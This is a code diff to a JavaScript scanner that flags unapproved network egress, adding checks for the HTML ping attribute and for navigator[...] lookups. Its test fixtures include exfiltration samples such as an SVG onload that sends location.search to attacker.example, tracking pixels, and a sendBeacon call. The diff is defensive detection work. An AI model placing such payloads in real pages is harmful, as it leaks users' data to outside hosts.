@@ -587,6 +587,7 @@ function hasUnapprovedHtmlEgress(content, approvedHosts) {
     }
   };
   const resourceListIsApproved = (value) => value.split(",").every((entry) => isApprovedResource(entry.trim().split(/\s+/)[0] ?? ""));
+  const spaceSeparatedResourceListIsApproved = (value) => value.trim().split(/\s+/).every((entry) => isApprovedResource(entry));
   let rejected = false;
   const visit = (node) => {
     if (rejected) return;
@@ -600,6 +601,7 @@ function hasUnapprovedHtmlEgress(content, approvedHosts) {
       if (name === "style") rejected = true;
       if (urlAttributes.has(name) && !isApprovedResource(attribute.value)) rejected = true;
       if (name === "srcset" && !resourceListIsApproved(attribute.value)) rejected = true;
+      if (name === "ping" && !spaceSeparatedResourceListIsApproved(attribute.value)) rejected = true;
     }
     for (const child of node.childNodes ?? []) visit(child);
   };
@@ -797,7 +799,7 @@ function hasAiRuntimeBoundary(content, path = "") {
     .replace(/\bfetch\s*\(\s*`https:\/\/discord\.com\/api\/v10\/webhooks\/\$\{interaction\.application_id\}\/\$\{interaction\.token\}\/messages\/@original`/g, "(");
   if (path === "apps/worker/src/app-assets.ts") fetchCapabilityRemainder = fetchCapabilityRemainder.replace(/\bfetch\s*\(\s*path/g, "(");
   const hasFetchCapabilityEscape = /\bfetch\b|["']fetch["']/.test(fetchCapabilityRemainder);
-  const hasDynamicCapabilityLookup = /\b(?:globalThis|Reflect|eval|Function)\b|\b(?:self|window)\s*\[/.test(normalizedContent);
+  const hasDynamicCapabilityLookup = /\b(?:globalThis|Reflect|eval|Function)\b|\b(?:self|window|navigator)\s*\[/.test(normalizedContent);
   const domSinkRemainder = normalizedContent.replace(/\bnew\s+URL\s*\(/g, "(");
   const domSinkPinnedFiles = new Set(["apps/worker/src/app-assets.ts", "apps/worker/src/index.ts"]);
   const hasUnapprovedHtmlActiveContent = normalizedPath.endsWith(".html")
@@ -859,6 +861,7 @@ for (const fixture of [
   { content: 'import "node:h' + "\\" + '\u2028' + 'ttps";', path: "apps/worker/src/provider.ts" },
   { content: 'import https from "node:https"; https.request({ hostname: env.REMOTE_HOST });', path: "apps/worker/src/provider.ts" },
   { content: 'const socket = new WebSocket(env.REMOTE_URL);', path: "apps/worker/src/provider.ts" },
+  { content: 'navigator["sendBeacon"](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
   { content: 'const form = document.createElement("form"); form.action = env.REMOTE_URL; form.submit();', path: "apps/worker/src/provider.ts" },
   { content: 'const image = new Image(); image.src = env.REMOTE_URL;', path: "apps/worker/src/provider.ts" },
   { content: 'location.href = ["https:", "//api.groq.com/openai/v1/responses"].join("");', path: "apps/worker/src/provider.ts" },
@@ -957,6 +960,7 @@ for (const fixture of [
   { content: '<svg onload="location=\'//attacker.example/\'+location.search"></svg>', path: "apps/brand-site/public/svg-event-egress.html" },
   { content: '<img src="//attacker.example/pixel">', path: "apps/brand-site/public/protocol-relative-egress.html" },
   { content: '<img src="/\\\\api.groq.com/openai/v1/pixel">', path: "apps/brand-site/public/backslash-resource-egress.html" },
+  { content: '<a href="/safe" ping="//api.groq.com/pixel">safe</a>', path: "apps/brand-site/public/ping-egress.html" },
   { content: '<div style="background:u\\\\72l(//api.groq.com/pixel)"></div>', path: "apps/brand-site/public/css-escape-egress.html" },
   { content: '<div style="background-image:image-set(\'//api.groq.com/pixel\' 1x)"></div>', path: "apps/brand-site/public/css-image-set-egress.html" },
   { content: "select create_ai_adapter();", path: "supabase/migrations/ai-adapter.sql" }
